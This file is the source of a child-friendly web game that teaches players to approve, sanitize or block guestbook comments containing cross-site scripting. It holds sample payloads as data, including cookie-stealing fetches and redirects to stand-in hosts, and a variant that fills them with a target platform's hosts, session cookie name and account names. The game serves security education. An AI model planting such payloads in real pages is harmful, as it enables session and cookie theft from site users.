import { useMemo, useState, useCallback, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Shield, ShieldCheck, ShieldAlert, Check, X, Eye, EyeOff,
  Cookie, MessageSquare, Send, Lock, Unlock, AlertTriangle,
  Sparkles, ChevronRight, RotateCcw, Trophy, Code, Zap
} from 'lucide-react';
import type { OpsContextProps } from '@/lib/opsContext';

interface Props extends OpsContextProps {
  onScoreChange: (score: number) => void;
}

type CommentType = 'safe' | 'script_tag' | 'event_handler' | 'encoded' | 'javascript_proto';
type ActionType = 'approve' | 'sanitize' | 'block';

interface CommentItem {
  id: number;
  text: string;
  displayText: string;
  type: CommentType;
  correctAction: ActionType;
  level: number;
  username: string;
  avatar: string;
}

interface LevelConfig {
  id: number;
  name: string;
  description: string;
  commentCount: number;
  types: CommentType[];
}

const LEVELS: LevelConfig[] = [
  {
    id: 1,
    name: 'Script Spotter',
    description: 'Look for obvious <script> tags hidden in comments!',
    commentCount: 4,
    types: ['safe', 'safe', 'script_tag', 'script_tag'],
  },
  {
    id: 2,
    name: 'Event Hunter',
    description: 'Watch out for sneaky event handlers like onerror and onclick!',
    commentCount: 5,
    types: ['safe', 'script_tag', 'event_handler', 'safe', 'event_handler'],
  },
  {
    id: 3,
    name: 'Code Decoder',
    description: 'Some scripts are encoded! Use X-Ray vision to spot them.',
    commentCount: 5,
    types: ['safe', 'script_tag', 'event_handler', 'encoded', 'safe'],
  },
  {
    id: 4,
    name: 'Protocol Pro',
    description: 'Tricky attacks using javascript: protocol in links!',
    commentCount: 6,
    types: ['safe', 'event_handler', 'encoded', 'javascript_proto', 'safe', 'script_tag'],
  },
];

const COMMENT_TEMPLATES: Record<CommentType, { text: string; display: string; correct: ActionType }[]> = {
  safe: [
    { text: 'I love this site!', display: 'I love this site!', correct: 'approve' },
    { text: 'The puppy pictures are so cute!', display: 'The puppy pictures are so cute!', correct: 'approve' },
    { text: 'Can we have more games please?', display: 'Can we have more games please?', correct: 'approve' },
    { text: 'My favorite color is purple!', display: 'My favorite color is purple!', correct: 'approve' },
    { text: 'Hello from CyberPaw fans!', display: 'Hello from CyberPaw fans!', correct: 'approve' },
    { text: 'This website is awesome!', display: 'This website is awesome!', correct: 'approve' },
  ],
  script_tag: [
    { text: "<script>stealCookies()</script>", display: '<script>stealCookies()</script>', correct: 'block' },
    { text: "<script>alert('hacked')</script>", display: "<script>alert('hacked')</script>", correct: 'block' },
    { text: "<SCRIPT>document.location='evil.com'</SCRIPT>", display: "<SCRIPT>document.location='evil.com'</SCRIPT>", correct: 'block' },
    { text: "<script>fetch('bad-site.com?c='+document.cookie)</script>", display: "<script>fetch('bad-site.com?c='+document.cookie)</script>", correct: 'block' },
  ],
  event_handler: [
    { text: "<img src=x onerror=alert('hacked')>", display: "<img src=x onerror=alert('hacked')>", correct: 'sanitize' },
    { text: "<body onload=stealData()>", display: "<body onload=stealData()>", correct: 'sanitize' },
    { text: "<button onclick='sendCookies()'>Click me!</button>", display: "<button onclick='sendCookies()'>Click me!</button>", correct: 'sanitize' },
    { text: "<input onfocus='alert(1)'>", display: "<input onfocus='alert(1)'>", correct: 'sanitize' },
  ],
  encoded: [
    { text: "&lt;script&gt;stealCookies()&lt;/script&gt;", display: "<script>stealCookies()</script>", correct: 'block' },
    { text: "&lt;img src=x onerror=alert(1)&gt;", display: "<img src=x onerror=alert(1)>", correct: 'sanitize' },
    { text: "%3Cscript%3EbadCode()%3C/script%3E", display: "<script>badCode()</script>", correct: 'block' },
    { text: "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;", display: "<script>", correct: 'block' },
  ],
  javascript_proto: [
    { text: "<a href='javascript:stealCookies()'>Click here!</a>", display: "<a href='javascript:stealCookies()'>Click here!</a>", correct: 'sanitize' },
    { text: "<a href='javascript:alert(1)'>Free prize!</a>", display: "<a href='javascript:alert(1)'>Free prize!</a>", correct: 'sanitize' },
    { text: "<iframe src='javascript:location.href=\\'evil.com\\''>", display: "<iframe src='javascript:location.href=evil.com'></iframe>", correct: 'block' },
    { text: "<form action='javascript:submitToBad()'>", display: "<form action='javascript:submitToBad()'></form>", correct: 'sanitize' },
  ],
};

const USERNAMES = ['CyberKitty', 'PixelPup', 'NetNinja', 'CodeCub', 'ByteBunny', 'DataDoge', 'WebWhale'];
const AVATARS = ['🐱', '🐶', '🦊', '🐻', '🐰', '🐼', '🐨'];

function buildOpsCommentTemplates({ target }: NonNullable<OpsContextProps['opsContext']>): Record<CommentType, { text: string; display: string; correct: ActionType }[]> {
  return {
    safe: [
      { text: `${target.platformName} login worked for me.`, display: `${target.platformName} login worked for me.`, correct: 'approve' },
      { text: `The ${target.widgetName} looks clean today.`, display: `The ${target.widgetName} looks clean today.`, correct: 'approve' },
      { text: `Please add more docs for ${target.apiName}.`, display: `Please add more docs for ${target.apiName}.`, correct: 'approve' },
    ],
    script_tag: [
      { text: `<script>fetch('${target.hosts.old}?c='+document.cookie)</script>`, display: `<script>fetch('${target.hosts.old}?c='+document.cookie)</script>`, correct: 'block' },
      { text: `<script>document.location='${target.hosts.old}'</script>`, display: `<script>document.location='${target.hosts.old}'</script>`, correct: 'block' },
    ],
    event_handler: [
      { text: `<img src=x onerror=fetch('${target.hosts.vendor}/${target.sessionCookieName}')>`, display: `<img src=x onerror=fetch('${target.hosts.vendor}/${target.sessionCookieName}')>`, correct: 'sanitize' },
      { text: `<button onclick='send${target.targetId}Session()'>Click me</button>`, display: `<button onclick='send${target.targetId}Session()'>Click me</button>`, correct: 'sanitize' },
    ],
    encoded: [
      { text: `&lt;script&gt;fetch('${target.hosts.old}')&lt;/script&gt;`, display: `<script>fetch('${target.hosts.old}')</script>`, correct: 'block' },
      { text: `%3Cscript%3E${target.sessionCookieName}%3C/script%3E`, display: `<script>${target.sessionCookieName}</script>`, correct: 'block' },
    ],
    javascript_proto: [
      { text: `<a href='javascript:fetch("${target.hosts.old}")'>${target.platformName}</a>`, display: `<a href='javascript:fetch("${target.hosts.old}")'>${target.platformName}</a>`, correct: 'sanitize' },
      { text: `<iframe src='javascript:location.href="${target.hosts.old}"'>`, display: `<iframe src='javascript:location.href="${target.hosts.old}"'></iframe>`, correct: 'block' },
    ],
  };
}

function generateComments(
  level: LevelConfig,
  templatesByType: Record<CommentType, { text: string; display: string; correct: ActionType }[]> = COMMENT_TEMPLATES,
  usernames: string[] = USERNAMES,
): CommentItem[] {
  const comments: CommentItem[] = [];
  const usedTemplates = new Map<CommentType, number>();

  for (let i = 0; i < level.commentCount; i++) {
    const type = level.types[i];
    const templates = templatesByType[type];
    const usedIdx = usedTemplates.get(type) || 0;
    const template = templates[usedIdx % templates.length];
    usedTemplates.set(type, usedIdx + 1);

    comments.push({
      id: i,
      text: template.text,
      displayText: template.display,
      type,
      correctAction: template.correct,
      level: level.id,
      username: usernames[i % usernames.length],
      avatar: AVATARS[i % AVATARS.length],
    });
  }
  return comments;
}

function getActionLabel(action: ActionType): string {
  switch (action) {
    case 'approve': return 'Approve';
    case 'sanitize': return 'Sanitize';
    case 'block': return 'Block';
  }
}

function getActionColor(action: ActionType): string {
  switch (action) {
    case 'approve': return '#4ADE80';
    case 'sanitize': return '#FACC15';
    case 'block': return '#F87171';
  }
}

export default function XSSXpert({ onScoreChange, opsContext }: Props) {
  const commentTemplates = useMemo(() => opsContext ? buildOpsCommentTemplates(opsContext) : COMMENT_TEMPLATES, [opsContext]);
  const usernames = useMemo(() => opsContext
    ? [opsContext.target.standardUser, opsContext.target.adminUser, opsContext.target.serviceAccount, opsContext.target.supportEmail.split('@')[0]]
    : USERNAMES, [opsContext]);
  const [currentLevel, setCurrentLevel] = useState(0);
  const [comments, setComments] = useState<CommentItem[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [score, setScore] = useState(0);
  const [lives, setLives] = useState(3);
  const [xrayEnabled, setXrayEnabled] = useState(false);
  const [gameState, setGameState] = useState<'menu' | 'playing' | 'levelComplete' | 'gameOver' | 'allComplete'>('menu');
  const [lastAction, setLastAction] = useState<{ action: ActionType; correct: boolean } | null>(null);
  const [showAttack, setShowAttack] = useState(false);
  const [cookiesStolen, setCookiesStolen] = useState(false);
  const [shieldAnim, setShieldAnim] = useState(false);
  const [shakeScreen, setShakeScreen] = useState(false);
  const [processedComments, setProcessedComments] = useState<{ comment: CommentItem; action: ActionType; correct: boolean }[]>([]);

  const level = LEVELS[currentLevel];
  const currentComment = comments[currentIndex];

  const startLevel = useCallback((lvlIdx: number) => {
    const lvl = LEVELS[lvlIdx];
    setComments(generateComments(lvl, commentTemplates, usernames));
    setCurrentIndex(0);
    setXrayEnabled(false);
    setLastAction(null);
    setShowAttack(false);
    setCookiesStolen(false);
    setShieldAnim(false);
    setShakeScreen(false);
    setProcessedComments([]);
    setGameState('playing');
  }, [commentTemplates, usernames]);

  const startGame = () => {
    setCurrentLevel(0);
    setScore(0);
    setLives(3);
    onScoreChange(0);
    startLevel(0);
  };

  const handleAction = (action: ActionType) => {
    if (!currentComment || gameState !== 'playing') return;

    const correct = action === currentComment.correctAction;
    setLastAction({ action, correct });

    if (correct) {
      const newScore = score + 25;
      setScore(newScore);
      onScoreChange(Math.min(100, newScore));
      setShieldAnim(true);
      setTimeout(() => setShieldAnim(false), 600);
    } else {
      setLives((prev) => {
        const newLives = prev - 1;
        if (newLives <= 0) {
          setGameState('gameOver');
        }
        return newLives;
      });
      if (currentComment.type !== 'safe') {
        setShowAttack(true);
        setCookiesStolen(true);
        setShakeScreen(true);
        setTimeout(() => {
          setShowAttack(false);
          setShakeScreen(false);
        }, 1200);
      }
    }

    setProcessedComments((prev) => [...prev, { comment: currentComment, action, correct }]);

    setTimeout(() => {
      if (currentIndex + 1 >= comments.length) {
        const allCorrect = processedComments.filter((p) => p.correct).length + (correct ? 1 : 0) === comments.length;
        if (currentLevel >= LEVELS.length - 1) {
          setGameState('allComplete');
        } else {
          setGameState('levelComplete');
        }
      } else {
        setCurrentIndex((prev) => prev + 1);
        setLastAction(null);
        setShowAttack(false);
      }
    }, 800);
  };

  const nextLevel = () => {
    if (currentLevel < LEVELS.length - 1) {
      setCurrentLevel((prev) => prev + 1);
      startLevel(currentLevel + 1);
    }
  };

  const isXSS = (type: CommentType): boolean => type !== 'safe';

  const getCommentColor = (type: CommentType): string => {
    if (type === 'safe') return '#4ADE80';
    if (type === 'script_tag') return '#F87171';
    if (type === 'event_handler') return '#FB923C';
    if (type === 'encoded') return '#A78BFA';
    return '#F472B6';
  };

  // Menu screen
  if (gameState === 'menu') {
    return (
      <div className="flex flex-col items-center gap-4 p-4">
        <div className="w-full max-w-lg bg-purple-dark rounded-2xl border-4 border-black p-6 flex flex-col items-center gap-3 card-shadow">
          <Shield size={48} strokeWidth={3} className="text-green-success" />
          <h2 className="font-fredoka text-2xl text-white text-outline-sm">XSS Xpert</h2>
          <p className="font-nunito text-sm text-purple-lighter text-center">
            Learn to spot and stop Cross-Site Scripting attacks! Read comments, use X-Ray vision, and defend the website.
          </p>
          <div className="flex items-center gap-2 mt-1">
            <Code size={18} strokeWidth={3} className="text-yellow-accent" />
            <span className="font-nunito text-xs text-purple-lighter">4 Levels</span>
            <span className="text-purple-lighter">|</span>
            <ShieldCheck size={18} strokeWidth={3} className="text-green-success" />
            <span className="font-nunito text-xs text-purple-lighter">Approve / Sanitize / Block</span>
          </div>
          <button
            onClick={startGame}
            className="mt-2 px-8 py-3 bg-green-success text-black border-[3px] border-black rounded-full font-nunito font-bold hover:scale-105 transition-transform flex items-center gap-2"
          >
            <Zap size={20} strokeWidth={3} />
            Start Defense
          </button>
        </div>

        {/* How to Play */}
        <div className="w-full max-w-lg bg-white rounded-2xl border-4 border-black p-4 card-shadow">
          <h3 className="font-fredoka text-lg text-purple-dark mb-2 text-center">How to Play</h3>
          <div className="space-y-2">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-green-success border-[3px] border-black flex items-center justify-center flex-shrink-0">
                <Check size={14} strokeWidth={4} className="text-black" />
              </div>
              <span className="font-nunito text-xs text-purple-dark"><b>Approve</b> — Safe comments with no hidden code</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-yellow-accent border-[3px] border-black flex items-center justify-center flex-shrink-0">
                <Sparkles size={14} strokeWidth={3} className="text-black" />
              </div>
              <span className="font-nunito text-xs text-purple-dark"><b>Sanitize</b> — Removes bad code but keeps the comment</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-red-alert border-[3px] border-black flex items-center justify-center flex-shrink-0">
                <X size={14} strokeWidth={4} className="text-white" />
              </div>
              <span className="font-nunito text-xs text-purple-dark"><b>Block</b> — Reject obvious malicious attacks</span>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-full bg-purple-primary border-[3px] border-black flex items-center justify-center flex-shrink-0">
                <Eye size={14} strokeWidth={3} className="text-white" />
              </div>
              <span className="font-nunito text-xs text-purple-dark"><b>X-Ray Vision</b> — Reveal hidden HTML and scripts</span>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center gap-3 p-4">
      {/* HUD */}
      <div className="w-full max-w-lg flex items-center justify-between bg-purple-dark rounded-xl border-[3px] border-black px-4 py-2">
        <div className="flex items-center gap-2">
          <span className="font-nunito text-xs font-bold text-purple-lighter">Lvl {level.id}</span>
          <span className="font-nunito text-xs font-bold text-white">{level.name}</span>
        </div>
        <div className="flex items-center gap-1">
          {[1, 2, 3].map((i) => (
            <Cookie
              key={i}
              size={16}
              strokeWidth={3}
              className={i <= lives ? 'text-yellow-accent' : 'text-purple-lighter'}
              fill={i <= lives ? '#FACC15' : '#DDD6FE'}
            />
          ))}
        </div>
        <div className="font-nunito text-xs font-bold text-green-success">Score: {score}</div>
      </div>

      {/* Website Preview Panel */}
      <motion.div
        className="w-full max-w-lg bg-white rounded-2xl border-4 border-black overflow-hidden card-shadow"
        animate={shakeScreen ? { x: [-6, 6, -6, 6, -4, 4, 0] } : { x: 0 }}
        transition={{ duration: 0.5 }}
      >
        {/* Browser Header */}
        <div className="bg-purple-primary border-b-[3px] border-black px-3 py-2 flex items-center gap-2">
          <div className="flex gap-1.5">
            <div className="w-3 h-3 rounded-full bg-red-alert border-2 border-black" />
            <div className="w-3 h-3 rounded-full bg-yellow-accent border-2 border-black" />
            <div className="w-3 h-3 rounded-full bg-green-success border-2 border-black" />
          </div>
          <div className="flex-1 bg-white border-2 border-black rounded-full px-3 py-0.5 flex items-center gap-1">
            <Lock size={10} strokeWidth={3} className="text-green-success" />
            <span className="font-nunito text-[10px] text-purple-dark">{opsContext?.target.primaryDomain ?? 'cyberpaws.kids'}/comments</span>
          </div>
        </div>

        {/* Website Content */}
        <div className="p-3 bg-purple-pale min-h-[120px] relative">
          {/* Attack Flash Overlay */}
          <AnimatePresence>
            {showAttack && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="absolute inset-0 bg-red-alert z-20 flex items-center justify-center"
              >
                <div className="flex flex-col items-center">
                  <AlertTriangle size={32} strokeWidth={3} className="text-white" />
                  <span className="font-fredoka text-lg text-white text-outline-sm">XSS ATTACK!</span>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Site Header */}
          <div className="flex items-center gap-2 mb-3">
            <div className="w-10 h-10 rounded-full bg-purple-primary border-[3px] border-black flex items-center justify-center">
              <span className="text-lg">🐾</span>
            </div>
            <div>
              <h4 className="font-fredoka text-sm text-purple-dark">
                {opsContext ? `${opsContext.target.platformName} Comments` : 'CyberPaws Guestbook'}
              </h4>
              <div className="flex items-center gap-1">
                <Cookie size={10} strokeWidth={3} className={cookiesStolen ? 'text-red-alert' : 'text-yellow-accent'} fill={cookiesStolen ? '#F87171' : '#FACC15'} />
                <span className="font-nunito text-[10px] text-purple-dark">
                  {cookiesStolen ? 'Cookies stolen!' : 'Cookies safe'}
                </span>
              </div>
            </div>
          </div>

          {/* Processed Comments */}
          <div className="space-y-1.5 max-h-[100px] overflow-y-auto">
            {processedComments.slice(-3).map((pc, i) => (
              <motion.div
                key={i}
                initial={{ x: -20, opacity: 0 }}
                animate={{ x: 0, opacity: 1 }}
                className="flex items-start gap-1.5 bg-white rounded-xl border-2 border-black p-1.5"
                style={{ borderLeftWidth: 4, borderLeftColor: pc.correct ? '#4ADE80' : '#F87171' }}
              >
                <span className="text-sm">{pc.comment.avatar}</span>
                <div className="flex-1 min-w-0">
                  <span className="font-nunito text-[9px] font-bold text-purple-dark">{pc.comment.username}</span>
                  <p className="font-nunito text-[10px] text-purple-dark truncate">
                    {pc.action === 'sanitize' ? '[Sanitized] Clean comment' : pc.comment.displayText}
                  </p>
                </div>
                {pc.correct ? (
                  <Check size={12} strokeWidth={4} className="text-green-success flex-shrink-0" />
                ) : (
                  <X size={12} strokeWidth={4} className="text-red-alert flex-shrink-0" />
                )}
              </motion.div>
            ))}
            {processedComments.length === 0 && (
              <p className="font-nunito text-[10px] text-purple-light text-center py-2">No comments yet. Defend the site!</p>
            )}
          </div>
        </div>
      </motion.div>

      {/* Current Comment Card */}
      <AnimatePresence mode="wait">
        {currentComment && gameState === 'playing' && (
          <motion.div
            key={currentComment.id}
            initial={{ x: -100, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: 100, opacity: 0 }}
            transition={{ type: 'spring', stiffness: 300, damping: 25 }}
            className="w-full max-w-lg bg-white rounded-2xl border-4 border-black p-4 card-shadow"
          >
            {/* Comment Header */}
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-2">
                <div
                  className="w-10 h-10 rounded-full border-[3px] border-black flex items-center justify-center text-lg"
                  style={{ backgroundColor: getCommentColor(currentComment.type) + '30' }}
                >
                  {currentComment.avatar}
                </div>
                <div>
                  <span className="font-nunito text-sm font-bold text-purple-dark">{currentComment.username}</span>
                  <div className="flex items-center gap-1">
                    <MessageSquare size={10} strokeWidth={3} className="text-purple-light" />
                    <span className="font-nunito text-[9px] text-purple-light">Comment #{currentIndex + 1} of {comments.length}</span>
                  </div>
                </div>
              </div>

              {/* X-Ray Toggle */}
              <button
                onClick={() => setXrayEnabled(!xrayEnabled)}
                className={`flex items-center gap-1 px-3 py-1.5 rounded-full border-[3px] border-black font-nunito text-xs font-bold transition-colors ${
                  xrayEnabled ? 'bg-purple-primary text-white' : 'bg-purple-pale text-purple-dark hover:bg-purple-lighter'
                }`}
              >
                {xrayEnabled ? <Eye size={14} strokeWidth={3} /> : <EyeOff size={14} strokeWidth={3} />}
                X-Ray
              </button>
            </div>

            {/* Comment Text */}
            <div
              className="bg-purple-pale rounded-xl border-[3px] border-black p-3 mb-3 relative overflow-hidden"
            >
              <p className="font-mono text-sm text-purple-dark break-all">
                {xrayEnabled && isXSS(currentComment.type) ? (
                  <>
                    <span className="text-red-alert font-bold">⚠️ XSS DETECTED! </span>
                    <span className="bg-red-alert text-white px-1 rounded">{currentComment.displayText}</span>
                  </>
                ) : (
                  currentComment.displayText
                )}
              </p>

              {/* X-Ray badge for safe comments */}
              {xrayEnabled && currentComment.type === 'safe' && (
                <span className="text-green-success font-bold text-xs">✅ SAFE — No malicious code found</span>
              )}

              {/* Shield animation on correct */}
              <AnimatePresence>
                {shieldAnim && (
                  <motion.div
                    initial={{ scale: 0, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    exit={{ scale: 2, opacity: 0 }}
                    className="absolute inset-0 flex items-center justify-center bg-green-success/90"
                  >
                    <ShieldCheck size={40} strokeWidth={3} className="text-white" />
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Action Buttons */}
            <div className="grid grid-cols-3 gap-2">
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => handleAction('approve')}
                className="flex flex-col items-center gap-1 py-2 bg-green-success border-[3px] border-black rounded-xl hover:brightness-95 transition-all"
              >
                <Check size={20} strokeWidth={4} className="text-black" />
                <span className="font-nunito text-xs font-bold text-black">Approve</span>
              </motion.button>
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => handleAction('sanitize')}
                className="flex flex-col items-center gap-1 py-2 bg-yellow-accent border-[3px] border-black rounded-xl hover:brightness-95 transition-all"
              >
                <Sparkles size={20} strokeWidth={3} className="text-black" />
                <span className="font-nunito text-xs font-bold text-black">Sanitize</span>
              </motion.button>
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => handleAction('block')}
                className="flex flex-col items-center gap-1 py-2 bg-red-alert border-[3px] border-black rounded-xl hover:brightness-95 transition-all"
              >
                <ShieldAlert size={20} strokeWidth={3} className="text-white" />
                <span className="font-nunito text-xs font-bold text-white">Block</span>
              </motion.button>
            </div>

            {/* Feedback */}
            <AnimatePresence>
              {lastAction && (
                <motion.div
                  initial={{ y: 10, opacity: 0 }}
                  animate={{ y: 0, opacity: 1 }}
                  exit={{ y: -10, opacity: 0 }}
                  className={`mt-2 text-center py-1.5 rounded-xl border-[3px] border-black font-nunito text-xs font-bold ${
                    lastAction.correct ? 'bg-green-success text-black' : 'bg-red-alert text-white'
                  }`}
                >
                  {lastAction.correct
                    ? `Correct! ${getActionLabel(lastAction.action)} was the right choice!`
                    : `Oops! The correct action was "${getActionLabel(currentComment.correctAction)}"`}
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Level Complete */}
      <AnimatePresence>
        {gameState === 'levelComplete' && (
          <motion.div
            initial={{ scale: 0.8, y: 20 }}
            animate={{ scale: 1, y: 0 }}
            className="w-full max-w-lg bg-green-success rounded-2xl border-4 border-black p-5 flex flex-col items-center gap-2 card-shadow"
          >
            <ShieldCheck size={40} strokeWidth={3} className="text-white" />
            <h3 className="font-fredoka text-xl text-white text-outline-sm">Level {level.id} Complete!</h3>
            <p className="font-nunito text-xs text-white text-center">
              You defended against {comments.filter((c) => isXSS(c.type)).length} XSS attacks!
            </p>
            <div className="font-nunito text-sm font-bold text-white">Score: {score}</div>
            <button
              onClick={nextLevel}
              className="mt-1 px-6 py-2 bg-purple-primary text-white border-[3px] border-black rounded-full font-nunito font-bold hover:scale-105 transition-transform flex items-center gap-1"
            >
              Next Level
              <ChevronRight size={16} strokeWidth={3} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* All Complete */}
      <AnimatePresence>
        {gameState === 'allComplete' && (
          <motion.div
            initial={{ scale: 0.8, y: 20 }}
            animate={{ scale: 1, y: 0 }}
            className="w-full max-w-lg bg-yellow-accent rounded-2xl border-4 border-black p-5 flex flex-col items-center gap-2 card-shadow"
          >
            <Trophy size={40} strokeWidth={3} className="text-purple-dark" />
            <h3 className="font-fredoka text-xl text-purple-dark">XSS Xpert Champion!</h3>
            <p className="font-nunito text-xs text-purple-dark text-center">
              You completed all levels and mastered XSS defense!
            </p>
            <div className="font-nunito text-lg font-bold text-purple-dark">Final Score: {score}</div>
            <button
              onClick={startGame}
              className="mt-1 px-6 py-2 bg-purple-primary text-white border-[3px] border-black rounded-full font-nunito font-bold hover:scale-105 transition-transform flex items-center gap-1"
            >
              <RotateCcw size={16} strokeWidth={3} />
              Play Again
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Game Over */}
      <AnimatePresence>
        {gameState === 'gameOver' && (
          <motion.div
            initial={{ scale: 0.8, y: 20 }}
            animate={{ scale: 1, y: 0 }}
            className="w-full max-w-lg bg-red-alert rounded-2xl border-4 border-black p-5 flex flex-col items-center gap-2 card-shadow"
          >
            <ShieldAlert size={40} strokeWidth={3} className="text-white" />
            <h3 className="font-fredoka text-xl text-white text-outline-sm">Site Compromised!</h3>
            <p className="font-nunito text-xs text-white text-center">
              The attackers stole all the cookies! Try again.
            </p>
            <div className="font-nunito text-sm font-bold text-white">Score: {score}</div>
            <button
              onClick={startGame}
              className="mt-1 px-6 py-2 bg-purple-dark text-white border-[3px] border-black rounded-full font-nunito font-bold hover:scale-105 transition-transform flex items-center gap-1"
            >
              <RotateCcw size={16} strokeWidth={3} />
              Try Again
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Legend */}
      <div className="w-full max-w-lg bg-white rounded-2xl border-4 border-black p-3 card-shadow">
        <p className="font-nunito text-xs font-bold text-purple-dark mb-2 text-center">Attack Type Guide</p>
        <div className="flex flex-wrap items-center justify-center gap-2">
          {([
            ['script_tag', 'Script Tag', '#F87171'],
            ['event_handler', 'Event Handler', '#FB923C'],
            ['encoded', 'Encoded Script', '#A78BFA'],
            ['javascript_proto', 'JS Protocol', '#F472B6'],
          ] as [CommentType, string, string][]).map(([type, label, color]) => (
            <div key={type} className="flex items-center gap-1">
              <div className="w-4 h-4 rounded-full border-2 border-black" style={{ backgroundColor: color }} />
              <span className="font-nunito text-[10px] text-purple-dark">{label}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
